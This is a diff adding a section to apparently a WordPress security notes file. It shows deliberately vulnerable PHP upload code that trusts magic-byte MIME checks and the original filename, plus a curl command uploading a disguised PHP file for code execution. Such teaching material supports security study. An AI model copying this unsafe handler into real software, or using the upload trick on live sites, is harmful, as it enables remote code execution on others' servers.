@@ -2872,6 +2872,37 @@ exif_imagetype();
 finfo_file();
 ```
 
+- Vulnerable code-:
+
+```php
+add_action("wp_ajax_nopriv_upload_image_check_mime", "upload_image_check_mime");
+
+function upload_image_check_mime(){
+    $file = $_FILES["file"];
+    $file_type = mime_content_type($file["tmp_name"]);
+    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
+    $allowed_mime_type = array("image/png", "image/jpeg");
+
+    if(in_array($file_type, $allowed_mime_type)){
+        move_uploaded_file($file["tmp_name"], $file_path);
+        echo "file uploaded";
+    }
+    else{
+        echo "file mime type not accepted";
+    }
+}
+```
+
+- Exploitiation-:You need to prepare a valid png with magicbytes and save with `.php` file.[Link to magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
+
+```bash
+curl [url]/wp-admin/admin-ajax.php?action=upload_image_check_mime -F "file=@pwn.php"
+```
+
+------------------
+
+
+
 
 
 
